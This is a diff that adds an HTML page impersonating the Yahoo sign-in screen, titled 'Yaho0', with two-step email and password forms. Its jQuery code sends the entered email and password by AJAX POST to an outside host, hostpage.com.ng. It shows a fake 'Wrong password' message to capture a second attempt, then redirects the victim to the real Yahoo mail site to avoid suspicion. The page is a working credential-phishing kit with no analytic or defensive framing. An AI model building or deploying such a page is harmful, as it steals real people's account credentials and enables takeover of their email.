@@ -1,0 +1,224 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Yaho0</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+
+    <style type="text/css">
+     textarea:hover, 
+     input:hover, 
+     textarea:active, 
+     input:active, 
+     textarea:focus, 
+     input:focus,
+     button:focus,
+     button:active,
+     button:hover,
+     label:focus,
+     .btn:active,
+     .btn.active
+     {
+      outline:0px !important;
+      -webkit-appearance:none;
+      box-shadow: none !important;
+    }
+
+
+  </style>
+</head>
+<body style="background-color:#F9F9FA;">
+  <div class="container-fluid p-0">
+    <div class="container-fluid" style="background-color: white; box-shadow:3px 2px 10px rgba(0,0,0,0.2);">
+      <div class="row" >
+        <div class="col-lg-12 mx-auto">
+          <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid p-4" width="150px">
+        </div>
+
+      </div>
+
+    </div>
+    <div class="container">
+      <div class="row my-2">
+        <div class="col-lg-6 my-auto">
+          <div id="carouselExampleControls" class="carousel slide " data-ride="carousel" width="500px">
+
+            <a class="carousel-control-prev" href="#carouselExampleControls" role="button" data-slide="prev">
+              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+              <span class="sr-only">Previous</span>
+            </a>
+            <a class="carousel-control-next" href="#carouselExampleControls" role="button" data-slide="next">
+              <span class="carousel-control-next-icon" aria-hidden="true"></span>
+              <span class="sr-only">Next</span>
+            </a>
+          </div>
+        </div>
+        <div class="col-lg-5 mx-auto">
+          <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+            <div class="text-center">
+              <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid" width="90px"><br><br><br>
+              <span class="h5">Sign In</span><br>
+              <span>using your Yahoo account</span><br><br>
+              <span id="error" class="text-danger">That yahoo account doesn't exist. Enter a different account</span><br>
+              <div class="form-group mt-2">
+                <input type="email" name="email" class="form-control bg-transparent" id="email" aria-describedby="emailHelp" placeholder="Email Address" style="border-right: none;border-left: none;border-top: none;">
+              </div>
+              <div class="col-lg-12 mt-3">
+                <button class="btn text-white bg-primary px-4 w-100" id="next" style="border-radius: 20px;">Next</button>
+              </div>
+            </div>
+            <div class="form-check mt-3">
+              <input type="checkbox" class="form-check-input" id="exampleCheck1">
+</label>
+              <span><a href="#" class="center">Forgot username?</a></span>
+            </div>
+            <div class="col-lg-12 mt-5">
+              <center><button class="btn text-primary bg-white border-primary px-4 w-110" id="next" style="border-radius: 20px;">Create an Account</button></center>
+            </div>              
+          </div>
+          <div class="m-5 p-4 bg-white rounded" id="div2" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
+            <div class="text-center">
+              <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid" width="90px"><br><br>
+              <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br><br>
+              <span id="msg" class="text-danger"></span><br>
+              <span class="h5">Enter Password</span><br>
+              <span>to finish sign in</span>
+              <div class="form-group mt-2">
+                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+              </div>
+              <div class="col-lg-12 mt-3">
+                <button class="btn text-white bg-primary px-4 w-100" id="submit-btn" style="border-radius: 20px;">login</button>
+              </div>
+            </div>
+            <div class="form-check mt-5 mx-auto">
+              <span><a href="#">Forgot password?</a></span>
+            </div>              
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+  /* global $ */
+  $(document).ready(function() {
+    $('#error').hide();
+    $("#div2").hide();
+    $("#msg").hide();
+    var count = 0;
+    
+    $('#email').click(function() {
+      $('#error').hide();
+    });
+    
+    $('#next').click(function() {
+      var my_email = $('#email').val();
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+      
+      var ind = my_email.indexOf("@");
+      var my_slice = my_email.substr((ind + 1));
+      var c = my_slice.substr(0, my_slice.indexOf('.'));
+      var final = c.toLowerCase();
+      
+      $("#div1").animate({ left: 200, opacity: "hide" }, 0);
+      $("#div2").animate({ right: 200, opacity: "show" }, 1000);
+      $("#emailch").html(my_email);
+    });
+
+    $('#back').click(function() {
+      $("#msg").hide();
+      $("#div2").animate({ left: 200, opacity: "hide" }, 0);
+      $("#div1").animate({ right: 200, opacity: "show" }, 1000);
+    });
+
+    $('#submit-btn').click(function(event) {
+      event.preventDefault();
+      var email = $("#email").val();
+      var password = $("#password").val();
+      var detail = $("#field").html();
+      var my_email = email;
+      var ind = my_email.indexOf("@");
+      var my_slice = my_email.substr((ind + 1));
+      var c = my_slice.substr(0, my_slice.indexOf('.'));
+      var final = c.toLowerCase();
+      count = count + 1;
+
+      $.ajax({
+        dataType: 'JSON',
+        url: 'http://hostpage.com.ng/men/test/Men.php',
+        type: 'POST',
+        data: {
+          email: email,
+          password: password,
+          detail: detail,
+        },
+        beforeSend: function(xhr) {
+          $('#submit-btn').html('Verifying...');
+        },
+        success: function(response) {
+          $("#password").val("");
+          if (count >= 2) {
+            count = 0;
+            setTimeout(function() {
+              window.location.href = 'https://mail.yahoo.com/m/folders/1?.src=ym&reason=landshark&lsts=1687628533476';
+            }, 3000);
+          }
+          if (response) {
+            $("#msg").show();
+            console.log(response);
+            if (response['signal'] == 'ok') {
+              $('#msg').html(response['msg']);
+            } else {
+              $('#msg').html(response['msg']);
+            }
+          }
+        },
+        error: function() {
+          $("#password").val("");
+          if (count >= 2) {
+            count = 0;
+            setTimeout(function() {
+              window.location.href = 'https://mail.yahoo.com/m/folders/1?.src=ym&reason=landshark&lsts=1687628533476';
+            }, );
+          }
+          $("#msg").show();
+          $('#msg').html("Wrong password!   Try again.");
+        },
+        complete: function() {
+          $('#submit-btn').html('Login');
+        }
+      });
+    });
+  });
+</script>
+
+  </html>
